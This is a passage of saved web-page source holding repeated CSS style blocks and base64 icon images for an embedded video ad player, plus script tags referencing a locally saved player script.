c1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><script src="./index_files/vidoomy-player(1).js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><script src="./index_files/vidoomy-player.js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
